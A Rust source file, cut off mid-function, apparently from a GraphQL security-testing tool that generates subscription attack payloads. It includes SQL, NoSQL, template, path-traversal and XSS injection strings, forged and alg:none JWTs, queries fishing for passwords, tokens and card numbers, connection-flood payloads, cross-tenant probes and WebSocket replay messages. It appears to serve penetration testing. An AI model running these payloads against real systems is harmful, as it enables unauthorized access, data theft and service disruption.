/// Maximum concurrent subscriptions to generate for resource exhaustion attacks.
const MAX_CONCURRENT_SUBSCRIPTIONS: usize = 256;

/// Maximum number of injection variants per filter argument.
const MAX_INJECTION_VARIANTS: usize = 32;

/// Common subscription field names used for blind enumeration when introspection is disabled.
pub const SUBSCRIPTION_ENUMERATION_FIELDS: &[&str] = &[
    "onMessage",
    "onNotification",
    "onUserUpdate",
    "onOrderUpdate",
    "onPaymentProcessed",
    "onItemCreated",
    "onItemUpdated",
    "onItemDeleted",
    "onCommentAdded",
    "onStatusChange",
    "onFileUploaded",
    "onError",
    "onAlert",
    "onLog",
    "onMetric",
    "newMessage",
    "newNotification",
    "messageAdded",
    "userJoined",
    "userLeft",
    "taskUpdated",
    "dataChanged",
    "liveScore",
    "priceUpdate",
    "tradeExecuted",
    "chatMessage",
    "presenceChanged",
    "typingIndicator",
    "documentEdited",
    "buildStatus",
    "deploymentUpdate",
    "inventoryChanged",
    "orderShipped",
    "ticketAssigned",
    "incidentCreated",
    "auditLogEntry",
];

/// Common tenant-identifier argument names for cross-tenant leakage probes.
const TENANT_ID_ARGS: &[&str] = &[
    "tenantId",
    "tenant_id",
    "orgId",
    "org_id",
    "organizationId",
    "organization_id",
    "workspaceId",
    "workspace_id",
    "accountId",
    "account_id",
    "companyId",
    "company_id",
    "teamId",
    "team_id",
];

/// Injection payloads targeting subscription filter arguments.
const FILTER_INJECTION_PAYLOADS: &[&str] = &[
    "\" OR 1=1 --",
    "' OR 1=1 --",
    "{$ne: null}",
    "{$gt: \"\"}",
    "true) { id } onMessage(filter: true",
    "1; DROP TABLE subscriptions; --",
    "${7*7}",
    "{{7*7}}",
    "__proto__",
    "constructor.prototype",
    "../../../etc/passwd",
    "<script>alert(1)</script>",
    "\\u0000",
    "' UNION SELECT * FROM users --",
    "{\"$regex\": \".*\"}",
    "1 AND SLEEP(5)",
];

/// Sensitive fields to request during data exfiltration subscriptions.
const EXFILTRATION_FIELDS: &[&str] = &[
    "id",
    "__typename",
    "email",
    "username",
    "password",
    "passwordHash",
    "token",
    "accessToken",
    "refreshToken",
    "sessionId",
    "apiKey",
    "secretKey",
    "ssn",
    "creditCard",
    "phoneNumber",
    "address",
    "dateOfBirth",
    "ipAddress",
    "createdAt",
    "updatedAt",
    "data",
    "payload",
    "body",
    "content",
    "internalId",
    "role",
    "permissions",
];

// ─── Subscription Enumeration ────────────────────────────────────────────────

/// A discovered subscription type from enumeration.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DiscoveredSubscription {
    /// The subscription field name.
    pub field_name: String,
    /// How this subscription was discovered.
    pub discovery_method: SubscriptionDiscoveryMethod,
    /// Arguments accepted by this subscription (if discovered).
    pub arguments: Vec<SubscriptionArgument>,
    /// Return type fields (if discovered from introspection).
    pub return_fields: Vec<String>,
}

/// How a subscription field was discovered.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SubscriptionDiscoveryMethod {
    /// Found via GraphQL introspection query.
    Introspection,
    /// Found via "Did you mean" field suggestion brute-force.
    FieldSuggestion,
    /// Found via blind probing (field exists if no "field not found" error).
    BlindProbe,
    /// Found via WebSocket message inspection.
    WebSocketInspection,
}

/// An argument on a subscription field.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SubscriptionArgument {
    pub name: String,
    pub type_name: String,
    pub required: bool,
}

/// Result of subscription enumeration across all methods.
#[derive(Debug, Clone)]
pub struct SubscriptionEnumerationResult {
    /// All discovered subscriptions.
    pub subscriptions: Vec<DiscoveredSubscription>,
    /// Introspection queries generated for manual execution.
    pub introspection_queries: Vec<String>,
    /// Blind probe queries generated for manual execution.
    pub blind_probes: Vec<SubscriptionProbeQuery>,
    /// Suggestion brute-force probes.
    pub suggestion_probes: Vec<SubscriptionProbeQuery>,
}

/// A probe query for subscription discovery.
#[derive(Debug, Clone)]
pub struct SubscriptionProbeQuery {
    /// The GraphQL subscription query string.
    pub query: String,
    /// The field name being probed.
    pub target_field: String,
    /// The probe technique.
    pub technique: SubscriptionDiscoveryMethod,
}

/// Build the introspection query that extracts subscription type information.
pub fn build_subscription_introspection_query() -> String {
    r#"{ __schema { subscriptionType { name fields { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind fields { name type { name } } } } } } } }"#.to_string()
}

/// Build a targeted introspection query for a specific subscription field.
pub fn build_field_introspection_query(_field_name: &str) -> String {
    r#"{ __type(name: "Subscription") { fields { name args { name type { name kind } } type { name kind ofType { name fields { name } } } } } }"#.to_string()
}

/// Parse introspection response JSON to extract subscription fields.
///
/// Expects the response format from `build_subscription_introspection_query`.
/// Extracts field names, arguments, and return type fields from the schema.
pub fn parse_subscription_introspection(response_json: &str) -> Vec<DiscoveredSubscription> {
    let mut subscriptions = Vec::new();

    let Ok(value) = serde_json::from_str::<serde_json::Value>(response_json) else {
        return subscriptions;
    };

    let Some(fields) = value
        .pointer("/data/__schema/subscriptionType/fields")
        .and_then(|v| v.as_array())
    else {
        return subscriptions;
    };

    for field in fields {
        let Some(name) = field.get("name").and_then(|v| v.as_str()) else {
            continue;
        };

        let arguments = field
            .get("args")
            .and_then(|v| v.as_array())
            .map(|args| {
                args.iter()
                    .filter_map(|arg| {
                        let arg_name = arg.get("name")?.as_str()?;
                        let type_name = arg
                            .pointer("/type/name")
                            .and_then(|v| v.as_str())
                            .unwrap_or("Unknown");
                        let kind = arg
                            .pointer("/type/kind")
                            .and_then(|v| v.as_str())
                            .unwrap_or("");
                        Some(SubscriptionArgument {
                            name: arg_name.to_string(),
                            type_name: type_name.to_string(),
                            required: kind == "NON_NULL",
                        })
                    })
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();

        let return_fields = field
            .pointer("/type/ofType/fields")
            .or_else(|| field.pointer("/type/fields"))
            .and_then(|v| v.as_array())
            .map(|fs| {
                fs.iter()
                    .filter_map(|f| f.get("name").and_then(|v| v.as_str()).map(String::from))
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();

        subscriptions.push(DiscoveredSubscription {
            field_name: name.to_string(),
            discovery_method: SubscriptionDiscoveryMethod::Introspection,
            arguments,
            return_fields,
        });
    }

    subscriptions
}

/// Generate blind probe queries for subscription field discovery.
///
/// Each probe subscribes to a candidate field name with minimal selection
/// (`{ __typename }`). A server that returns a valid subscription acknowledgment
/// (rather than a "field not found" error) reveals the field exists.
pub fn generate_blind_probes(additional_fields: &[&str]) -> Vec<SubscriptionProbeQuery> {
    let mut probes = Vec::new();

    let all_fields: Vec<&str> = SUBSCRIPTION_ENUMERATION_FIELDS
        .iter()
        .copied()
        .chain(additional_fields.iter().copied())
        .collect();

    for field in all_fields {
        probes.push(SubscriptionProbeQuery {
            query: format!("subscription {{ {field} {{ __typename }} }}"),
            target_field: field.to_string(),
            technique: SubscriptionDiscoveryMethod::BlindProbe,
        });
    }

    probes
}

/// Generate "Did you mean" suggestion probes for subscription fields.
///
/// Sends misspelled subscription field names to trigger error messages
/// that leak real field names.
pub fn generate_suggestion_probes() -> Vec<SubscriptionProbeQuery> {
    let misspelled: &[&str] = &[
        "onMessge",
        "onNotifcation",
        "onUsrUpdate",
        "onOrdrUpdate",
        "onPaymnt",
        "onItmCreated",
        "newMessge",
        "msgAdded",
        "usrJoined",
        "tskUpdated",
        "dataChangd",
        "livScor",
        "prcUpdate",
        "chatMsg",
        "presnce",
        "typng",
        "docEdited",
        "bldStatus",
        "deplymnt",
        "invntory",
    ];

    misspelled
        .iter()
        .map(|probe| SubscriptionProbeQuery {
            query: format!("subscription {{ {probe} {{ __typename }} }}"),
            target_field: probe.to_string(),
            technique: SubscriptionDiscoveryMethod::FieldSuggestion,
        })
        .collect()
}

/// Run full subscription enumeration, producing queries for all discovery methods.
pub fn enumerate_subscriptions(
    introspection_response: Option<&str>,
    additional_fields: &[&str],
) -> SubscriptionEnumerationResult {
    let mut subscriptions = Vec::new();

    if let Some(response) = introspection_response {
        subscriptions.extend(parse_subscription_introspection(response));
    }

    let introspection_queries = vec![build_subscription_introspection_query()];
    let blind_probes = generate_blind_probes(additional_fields);
    let suggestion_probes = generate_suggestion_probes();

    SubscriptionEnumerationResult {
        subscriptions,
        introspection_queries,
        blind_probes,
        suggestion_probes,
    }
}

// ─── Authorization Bypass ────────────────────────────────────────────────────

/// Token variant for auth bypass testing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AuthBypassToken {
    /// No authorization header at all.
    NoToken,
    /// Empty authorization header.
    EmptyToken,
    /// Expired JWT (signature valid, exp in the past).
    ExpiredToken(String),
    /// Token for a different role than required.
    WrongRole(String),
    /// Token for a different user/tenant.
    WrongTenant(String),
    /// Malformed token that is not valid JWT/Bearer format.
    MalformedToken(String),
    /// Valid token but with tampered claims.
    TamperedClaims(String),
}

/// A generated auth bypass test case.
#[derive(Debug, Clone)]
pub struct AuthBypassTestCase {
    /// The subscription query to send.
    pub query: String,
    /// The token variant to use for this test.
    pub token: AuthBypassToken,
    /// Human-readable description of what this test checks.
    pub description: String,
    /// The subscription field being tested.
    pub target_field: String,
}

/// Generate a set of expired JWT tokens with common structures.
fn generate_expired_jwt() -> String {
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJleHAiOjE1MDAwMDAwMDB9.invalid_signature".to_string()
}

/// Generate a JWT-like token with wrong role claim.
fn generate_wrong_role_jwt() -> String {
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6Imd1ZXN0IiwiZXhwIjo5OTk5OTk5OTk5fQ.invalid_signature".to_string()
}

/// Generate a JWT-like token with a different tenant ID.
fn generate_wrong_tenant_jwt() -> String {
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTk5OTk5OTkiLCJ0ZW5hbnRJZCI6ImV2aWwtdGVuYW50IiwiZXhwIjo5OTk5OTk5OTk5fQ.invalid_signature".to_string()
}

/// Generate authorization bypass test cases for a subscription field.
///
/// Tests whether the subscription enforces the same authorization as
/// equivalent queries and mutations. Each test case pairs a subscription
/// query with a different token variant.
pub fn generate_auth_bypass_tests(
    subscription_field: &str,
    selection_set: &str,
) -> Vec<AuthBypassTestCase> {
    let query = format!("subscription {{ {subscription_field} {{ {selection_set} }} }}");
    let mut tests = Vec::new();

    tests.push(AuthBypassTestCase {
        query: query.clone(),
        token: AuthBypassToken::NoToken,
        description: format!(
            "Access '{subscription_field}' subscription with no authentication token"
        ),
        target_field: subscription_field.to_string(),
    });

    tests.push(AuthBypassTestCase {
        query: query.clone(),
        token: AuthBypassToken::EmptyToken,
        description: format!("Access '{subscription_field}' subscription with empty Bearer header"),
        target_field: subscription_field.to_string(),
    });

    tests.push(AuthBypassTestCase {
        query: query.clone(),
        token: AuthBypassToken::ExpiredToken(generate_expired_jwt()),
        description: format!("Access '{subscription_field}' subscription with expired JWT"),
        target_field: subscription_field.to_string(),
    });

    tests.push(AuthBypassTestCase {
        query: query.clone(),
        token: AuthBypassToken::WrongRole(generate_wrong_role_jwt()),
        description: format!("Access '{subscription_field}' subscription with guest role token"),
        target_field: subscription_field.to_string(),
    });

    tests.push(AuthBypassTestCase {
        query: query.clone(),
        token: AuthBypassToken::WrongTenant(generate_wrong_tenant_jwt()),
        description: format!(
            "Access '{subscription_field}' subscription with different tenant token"
        ),
        target_field: subscription_field.to_string(),
    });

    tests.push(AuthBypassTestCase {
        query: query.clone(),
        token: AuthBypassToken::MalformedToken("not-a-jwt-at-all".to_string()),
        description: format!("Access '{subscription_field}' subscription with malformed token"),
        target_field: subscription_field.to_string(),
    });

    tests.push(AuthBypassTestCase {
        query,
        token: AuthBypassToken::TamperedClaims(
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.".to_string(),
        ),
        description: format!(
            "Access '{subscription_field}' subscription with alg:none tampered JWT"
        ),
        target_field: subscription_field.to_string(),
    });

    tests
}

/// Generate auth bypass tests for multiple subscription fields.
pub fn generate_auth_bypass_suite(subscription_fields: &[&str]) -> Vec<AuthBypassTestCase> {
    subscription_fields
        .iter()
        .flat_map(|field| generate_auth_bypass_tests(field, "id __typename"))
        .collect()
}

// ─── Data Exfiltration ───────────────────────────────────────────────────────

/// A subscription crafted for passive data exfiltration.
#[derive(Debug, Clone)]
pub struct ExfiltrationSubscription {
    /// The subscription query requesting sensitive fields.
    pub query: String,
    /// The subscription field being targeted.
    pub target_field: String,
    /// Sensitive fields being requested.
    pub requested_fields: Vec<String>,
    /// Exfiltration technique classification.
    pub technique: ExfiltrationTechnique,
}

/// Classification of the exfiltration approach.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExfiltrationTechnique {
    /// Subscribe and passively collect all events.
    PassiveCollection,
    /// Subscribe with broad filter to capture maximum data.
    BroadFilter,
    /// Subscribe requesting fields that should be redacted.
    SensitiveFieldRequest,
    /// Subscribe to events that include other users' data.
    CrossUserData,
}

/// Generate data exfiltration subscriptions for a target field.
///
/// Produces subscriptions that request increasingly sensitive field sets,
/// from basic identifiers to PII and credentials.
pub fn generate_exfiltration_subscriptions(
    subscription_field: &str,
    known_fields: &[&str],
) -> Vec<ExfiltrationSubscription> {
    let mut subs = Vec::new();

    let basic_fields: Vec<&str> = if known_fields.is_empty() {
        EXFILTRATION_FIELDS.to_vec()
    } else {
        known_fields.to_vec()
    };

    let basic_selection = basic_fields.join(" ");
    subs.push(ExfiltrationSubscription {
        query: format!("subscription {{ {subscription_field} {{ {basic_selection} }} }}"),
        target_field: subscription_field.to_string(),
        requested_fields: basic_fields.iter().map(|f| f.to_string()).collect(),
        technique: ExfiltrationTechnique::PassiveCollection,
    });

    subs.push(ExfiltrationSubscription {
        query: format!(
            "subscription {{ {subscription_field}(filter: {{ }}) {{ {basic_selection} }} }}"
        ),
        target_field: subscription_field.to_string(),
        requested_fields: basic_fields.iter().map(|f| f.to_string()).collect(),
        technique: ExfiltrationTechnique::BroadFilter,
    });

    let sensitive_fields = [
        "password",
        "passwordHash",
        "token",
        "accessToken",
        "refreshToken",
        "secretKey",
        "apiKey",
        "ssn",
        "creditCard",
    ];
    let sensitive_selection = sensitive_fields.join(" ");
    subs.push(ExfiltrationSubscription {
        query: format!(
            "subscription SensitiveProbe {{ {subscription_field} {{ id {sensitive_selection} }} }}"
        ),
        target_field: subscription_field.to_string(),
        requested_fields: sensitive_fields.iter().map(|f| f.to_string()).collect(),
        technique: ExfiltrationTechnique::SensitiveFieldRequest,
    });

    subs.push(ExfiltrationSubscription {
        query: format!(
            "subscription CrossUser {{ {subscription_field} {{ id email username role permissions data }} }}"
        ),
        target_field: subscription_field.to_string(),
        requested_fields: vec![
            "id", "email", "username", "role", "permissions", "data",
        ]
        .into_iter()
        .map(String::from)
        .collect(),
        technique: ExfiltrationTechnique::CrossUserData,
    });

    subs
}

// ─── Resource Exhaustion ─────────────────────────────────────────────────────

/// A resource exhaustion attack payload.
#[derive(Debug, Clone)]
pub struct ResourceExhaustionPayload {
    /// Subscription queries to open concurrently.
    pub queries: Vec<String>,
    /// Number of concurrent subscriptions.
    pub concurrency: usize,
    /// Attack technique description.
    pub technique: ExhaustionTechnique,
    /// Estimated server resource impact classification.
    pub impact: ResourceImpact,
}

/// Technique used for resource exhaustion.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExhaustionTechnique {
    /// Open many identical subscriptions to exhaust connection slots.
    ConnectionFlood,
    /// Open subscriptions to different fields to maximize memory allocation.
    FieldDiversification,
    /// Open subscriptions with deeply nested selection sets.
    DeepSelectionExhaustion,
    /// Rapidly open and close subscriptions to exhaust lifecycle processing.
    RapidCycling,
}

/// Estimated resource impact level.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ResourceImpact {
    Low,
    Medium,
    High,
    Critical,
}

/// Generate resource exhaustion attack payloads.
///
/// Produces sets of subscription queries designed to exhaust server resources
/// through various strategies: connection flooding, field diversification,
/// deep selection sets, and rapid lifecycle cycling.
pub fn generate_exhaustion_payloads(
    subscription_fields: &[&str],
    concurrency: usize,
) -> Vec<ResourceExhaustionPayload> {
    let effective_concurrency = concurrency.min(MAX_CONCURRENT_SUBSCRIPTIONS);
    let mut payloads = Vec::new();

    if subscription_fields.is_empty() {
        return payloads;
    }

    let primary_field = subscription_fields[0];
    let flood_queries: Vec<String> = (0..effective_concurrency)
        .map(|_| format!("subscription {{ {primary_field} {{ __typename }} }}"))
        .collect();
    payloads.push(ResourceExhaustionPayload {
        concurrency: effective_concurrency,
        queries: flood_queries,
        technique: ExhaustionTechnique::ConnectionFlood,
        impact: if effective_concurrency >= 100 {
            ResourceImpact::Critical
        } else if effective_concurrency >= 50 {
            ResourceImpact::High
        } else {
            ResourceImpact::Medium
        },
    });

    let diverse_queries: Vec<String> = subscription_fields
        .iter()
        .cycle()
        .take(effective_concurrency)
        .map(|field| format!("subscription {{ {field} {{ id __typename createdAt }} }}"))
        .collect();
    payloads.push(ResourceExhaustionPayload {
        concurrency: effective_concurrency,
        queries: diverse_queries,
        technique: ExhaustionTechnique::FieldDiversification,
        impact: ResourceImpact::High,
    });

    let deep_selection = build_deep_selection(8);
    let deep_queries: Vec<String> = (0..effective_concurrency.min(32))
        .map(|_| format!("subscription {{ {primary_field} {{ {deep_selection} }} }}"))
        .collect();
    payloads.push(ResourceExhaustionPayload {
        concurrency: deep_queries.len(),
        queries: deep_queries,
        technique: ExhaustionTechnique::DeepSelectionExhaustion,
        impact: ResourceImpact::High,
    });

    let cycle_queries: Vec<String> = subscription_fields
        .iter()
        .cycle()
        .take(effective_concurrency)
        .map(|field| format!("subscription {{ {field} {{ id }} }}"))
        .collect();
    payloads.push(ResourceExhaustionPayload {
        concurrency: effective_concurrency,
        queries: cycle_queries,
        technique: ExhaustionTechnique::RapidCycling,
        impact: ResourceImpact::Medium,
    });

    payloads
}

/// Build a deeply nested selection set for exhaustion payloads.
fn build_deep_selection(depth: usize) -> String {
    let mut result = "id __typename".to_string();
    for _ in 0..depth {
        result = format!("edges {{ node {{ {result} }} }}");
    }
    result
}

// ─── Subscription Injection ──────────────────────────────────────────────────

/// An injection payload targeting subscription filter arguments.
#[derive(Debug, Clone)]
pub struct SubscriptionInjectionPayload {
    /// The complete subscription query with injected filter.
    pub query: String,
    /// The original subscription field.
    pub target_field: String,
    /// The argument being injected into.
    pub target_argument: String,
    /// The injection payload string.
    pub injection_value: String,
    /// Classification of the injection type.
    pub injection_type: InjectionType,
}

/// Classification of subscription argument injection.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionType {
    /// SQL injection through subscription filter.
    SqlInjection,
    /// NoSQL injection (MongoDB-style operators).
    NoSqlInjection,
    /// Server-Side Template Injection through filter.
    TemplateInjection,
    /// Prototype pollution via subscription arguments.
    PrototypePollution,
    /// Path traversal through subscription arguments.
    PathTraversal,
    /// Cross-site scripting through subscription data reflection.
    CrossSiteScripting,
    /// Null byte injection.
    NullByteInjection,
}

/// Map a raw injection payload to its injection type.
fn classify_injection(payload: &str) -> InjectionType {
    if payload.contains("OR 1=1")
        || payload.contains("UNION SELECT")
        || payload.contains("DROP TABLE")
        || payload.contains("SLEEP(")
    {
        InjectionType::SqlInjection
    } else if payload.contains("$ne") || payload.contains("$gt") || payload.contains("$regex") {
        InjectionType::NoSqlInjection
    } else if payload.contains("${") || payload.contains("{{") {
        InjectionType::TemplateInjection
    } else if payload.contains("__proto__") || payload.contains("constructor.prototype") {
        InjectionType::PrototypePollution
    } else if payload.contains("../") {
        InjectionType::PathTraversal
    } else if payload.contains("<script>") {
        InjectionType::CrossSiteScripting
    } else if payload.contains("\\u0000") {
        InjectionType::NullByteInjection
    } else {
        InjectionType::SqlInjection
    }
}

/// Generate injection payloads for a subscription's filter arguments.
///
/// Targets each argument with SQL injection, NoSQL injection, template injection,
/// prototype pollution, path traversal, and XSS payloads.
pub fn generate_injection_payloads(
    subscription_field: &str,
    arguments: &[&str],
) -> Vec<SubscriptionInjectionPayload> {
    let mut payloads = Vec::new();

    let target_args: Vec<&str> = if arguments.is_empty() {
        vec!["filter", "where", "input", "query", "id"]
    } else {
        arguments.to_vec()
    };

    for arg in &target_args {
        for injection in FILTER_INJECTION_PAYLOADS
            .iter()
            .take(MAX_INJECTION_VARIANTS)
        {
            let escaped = injection.replace('"', "\\\"");
            let query = format!(
                "subscription {{ {subscription_field}({arg}: \"{escaped}\") {{ id __typename }} }}"
            );
            payloads.push(SubscriptionInjectionPayload {
                query,
                target_field: subscription_field.to_string(),
                target_argument: arg.to_string(),
                injection_value: injection.to_string(),
                injection_type: classify_injection(injection),
            });
        }
    }

    payloads
}

// ─── Cross-Tenant Data Leakage ───────────────────────────────────────────────

/// A cross-tenant leakage probe.
#[derive(Debug, Clone)]
pub struct CrossTenantProbe {
    /// The subscription query with a foreign tenant identifier.
    pub query: String,
    /// The subscription field being probed.
    pub target_field: String,
    /// The tenant ID argument being manipulated.
    pub tenant_argument: String,
    /// The foreign tenant ID value injected.
    pub foreign_tenant_id: String,
    /// Probe technique description.
    pub technique: TenantLeakageTechnique,
}

/// Technique for cross-tenant leakage detection.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TenantLeakageTechnique {
    /// Subscribe with a different tenant's ID.
    DirectTenantSwitch,
    /// Subscribe without specifying a tenant (relies on server default).
    OmittedTenantId,
    /// Subscribe with wildcard/glob pattern as tenant ID.
    WildcardTenant,
    /// Subscribe with numeric tenant ID iteration.
    TenantEnumeration,
    /// Subscribe with null tenant to test null-safety.
    NullTenantId,
}

/// Foreign tenant ID values used for probing.
const FOREIGN_TENANT_IDS: &[(&str, TenantLeakageTechnique)] = &[
    (
        "00000000-0000-0000-0000-000000000000",
        TenantLeakageTechnique::DirectTenantSwitch,
    ),
    ("evil-tenant-id", TenantLeakageTechnique::DirectTenantSwitch),
    ("1", TenantLeakageTechnique::TenantEnumeration),
    ("2", TenantLeakageTechnique::TenantEnumeration),
    ("99999", TenantLeakageTechnique::TenantEnumeration),
    ("*", TenantLeakageTechnique::WildcardTenant),
    ("%", TenantLeakageTechnique::WildcardTenant),
    (".*", TenantLeakageTechnique::WildcardTenant),
];

/// Generate cross-tenant leakage probes for a subscription field.
///
/// For each plausible tenant-identifier argument name, generates subscriptions
/// that substitute a foreign tenant ID to test whether the server leaks data
/// across tenant boundaries.
pub fn generate_cross_tenant_probes(
    subscription_field: &str,
    known_tenant_args: &[&str],
) -> Vec<CrossTenantProbe> {
    let mut probes = Vec::new();

    let tenant_args: Vec<&str> = if known_tenant_args.is_empty() {
        TENANT_ID_ARGS.to_vec()
    } else {
        known_tenant_args.to_vec()
    };

    for arg in &tenant_args {
        probes.push(CrossTenantProbe {
            query: format!(
                "subscription {{ {subscription_field} {{ id __typename email data }} }}"
            ),
            target_field: subscription_field.to_string(),
            tenant_argument: arg.to_string(),
            foreign_tenant_id: String::new(),
            technique: TenantLeakageTechnique::OmittedTenantId,
        });

        probes.push(CrossTenantProbe {
            query: format!(
                "subscription {{ {subscription_field}({arg}: null) {{ id __typename email data }} }}"
            ),
            target_field: subscription_field.to_string(),
            tenant_argument: arg.to_string(),
            foreign_tenant_id: "null".to_string(),
            technique: TenantLeakageTechnique::NullTenantId,
        });

        for (tenant_id, technique) in FOREIGN_TENANT_IDS {
            probes.push(CrossTenantProbe {
                query: format!(
                    "subscription {{ {subscription_field}({arg}: \"{tenant_id}\") {{ id __typename email data }} }}"
                ),
                target_field: subscription_field.to_string(),
                tenant_argument: arg.to_string(),
                foreign_tenant_id: tenant_id.to_string(),
                technique: *technique,
            });
        }
    }

    probes
}

// ─── Subscription Replay ─────────────────────────────────────────────────────

/// A WebSocket message replay payload for session hijacking.
#[derive(Debug, Clone)]
pub struct ReplayPayload {
    /// The WebSocket message to replay.
    pub message: String,
    /// Classification of the replay technique.
    pub technique: ReplayTechnique,
    /// Description of the expected outcome if vulnerable.
    pub expected_outcome: String,
    /// The subscription field involved.
    pub target_field: String,
}

/// Technique for subscription replay attacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ReplayTechnique {
    /// Replay the `connection_init` message with stolen auth payload.
    ConnectionInitReplay,
    /// Replay a `subscribe` message with a stolen subscription ID.
    SubscribeReplay,
    /// Replay with modified subscription ID to hijack another session.
    SubscriptionIdTampering,
    /// Replay with `connection_init` using no auth (test if auth is only checked once).
    LateAuthRemoval,
    /// Send `subscribe` before `connection_init` to test message ordering enforcement.
    OutOfOrderSubscribe,
}

/// Generate WebSocket subscription replay payloads.
///
/// Produces protocol-level messages (graphql-ws and graphql-transport-ws formats)
/// that test for session hijacking via message replay and reordering.
pub fn generate_replay_payloads(subscription_field: &str) -> Vec<ReplayPayload> {
    let mut payloads = Vec::new();

    payloads.push(ReplayPayload {
        message: serde_json::json!({
            "type": "connection_init",
            "payload": {
                "authorization": "Bearer stolen-token-placeholder"
            }
        }).to_string(),
        technique: ReplayTechnique::ConnectionInitReplay,
        expected_outcome: "Server accepts replayed connection_init and authenticates attacker session".to_string(),
        target_field: subscription_field.to_string(),
    });

    payloads.push(ReplayPayload {
        message: serde_json::json!({
            "id": "1",
            "type": "subscribe",
            "payload": {
                "query": format!("subscription {{ {subscription_field} {{ id __typename }} }}")
            }
        })
        .to_string(),
        technique: ReplayTechnique::SubscribeReplay,
        expected_outcome: "Server processes replayed subscribe message on a new connection"
            .to_string(),
        target_field: subscription_field.to_string(),
    });

    payloads.push(ReplayPayload {
        message: serde_json::json!({
            "id": "hijacked-session-id",
            "type": "subscribe",
            "payload": {
                "query": format!("subscription {{ {subscription_field} {{ id email data }} }}")
            }
        })
        .to_string(),
        technique: ReplayTechnique::SubscriptionIdTampering,
        expected_outcome: "Server routes events to attacker using tampered subscription ID"
            .to_string(),
        target_field: subscription_field.to_string(),
    });

    payloads.push(ReplayPayload {
        message: serde_json::json!({
            "type": "connection_init",
            "payload": {}
        })
        .to_string(),
        technique: ReplayTechnique::LateAuthRemoval,
        expected_outcome:
            "Server accepts connection_init without auth after initial authenticated handshake"
                .to_string(),
        target_field: subscription_field.to_string(),
    });

    payloads.push(ReplayPayload {
        message: serde_json::json!({
            "id": "1",
            "type": "subscribe",
            "payload": {
                "query": format!("subscription {{ {subscription_field} {{ id __typename }} }}")
            }
        })
        .to_string(),
        technique: ReplayTechnique::OutOfOrderSubscribe,
        expected_outcome: "Server processes subscribe before connection_init, bypassing auth"
            .to_string(),
        target_field: subscription_field.to_string(),
    });

    payloads
}

// ─── Aggregate Engine ────────────────────────────────────────────────────────

/// Full result from the subscription abuse engine.
#[derive(Debug)]
pub struct SubscriptionAbuseResult {
    /// Discovered subscriptions from enumeration.
    pub enumeration: SubscriptionEnumerationResult,
    /// Auth bypass test cases.
    pub auth_bypass_tests: Vec<AuthBypassTestCase>,
    /// Data exfiltration subscriptions.
    pub exfiltration_subs: Vec<ExfiltrationSubscription>,
    /// Resource exhaustion payloads.
    pub exhaustion_payloads: Vec<ResourceExhaustionPayload>,
    /// Subscription argument injection payloads.
    pub injection_payloads: Vec<SubscriptionInjectionPayload>,
    /// Cross-tenant leakage probes.
    pub cross_tenant_probes: Vec<CrossTenantProbe>,
    /// WebSocket replay payloads.
    pub replay_payloads: Vec<ReplayPayload>,
    /// Total number of generated attack payloads across all techniques.
    pub total_payload_count: usize,
}

/// Configuration for the subscription abuse engine.
#[derive(Debug, Clone)]
pub struct SubscriptionAbuseConfig {
    /// Enable subscription enumeration.
    pub enable_enumeration: bool,
    /// Enable authorization bypass testing.
    pub enable_auth_bypass: bool,
    /// Enable data exfiltration subscriptions.
    pub enable_exfiltration: bool,
    /// Enable resource exhaustion payloads.
    pub enable_exhaustion: bool,
    /// Enable subscription injection.
    pub enable_injection: bool,
    /// Enable cross-tenant leakage probes.
    pub enable_cross_tenant: bool,
    /// Enable WebSocket replay attacks.
    pub enable_replay: bool,
    /// Number of concurrent subscriptions for exhaustion attacks.
    pub exhaustion_concurrency: usize,
}

impl Default for SubscriptionAbuseConfig {
    fn default() -> Self {
        Self {
            enable_enumeration: true,
            enable_auth_bypass: true,
            enable_exfiltration: true,
            enable_exhaustion: true,
            enable_injection: true,
            enable_cross_tenant: true,
            enable_replay: true,
            exhaustion_concurrency: 64,
        }
    }
}

/// Run the full subscription abuse engine.
///
/// Generates attack payloads for all enabled abuse patterns. This is a payload
/// generation engine only — it does not make network requests. The caller
/// sends generated payloads and processes responses.
pub fn run_subscription_abuse_engine(
    config: &SubscriptionAbuseConfig,
    introspection_response: Option<&str>,
    target_fields: &[&str],
) -> SubscriptionAbuseResult {
    let enumeration = if config.enable_enumeration {
        enumerate_subscriptions(introspection_response, target_fields)
    } else {
        SubscriptionEnumerationResult {
            subscriptions: Vec::new(),
            introspection_queries: Vec::new(),
            blind_probes: Vec::new(),
            suggestion_probes: Vec::new(),
        }
    };

    let effective_fields: Vec<&str> = if target_fields.is_empty() {
        enumeration
            .subscriptions
            .iter()
            .map(|s| s.field_name.as_str())
            .collect()
    } else {
        target_fields.to_vec()
    };

    let auth_bypass_tests = if config.enable_auth_bypass && !effective_fields.is_empty() {
        generate_auth_bypass_suite(&effective_fields)
    } else {
        Vec::new()
    };

    let exfiltration_subs = if config.enable_exfiltration {
        effective_fields
            .iter()
            .flat_map(|field| generate_exfiltration_subscriptions(field, &[]))
            .collect()
    } else {
        Vec::new()
    };

    let exhaustion_payloads = if config.enable_exhaustion && !effective_fields.is_empty() {
        generate_exhaustion_payloads(&effective_fields, config.exhaustion_concurrency)
    } else {
        Vec::new()
    };

    let injection_payloads = if config.enable_injection {
        effective_fields
            .iter()
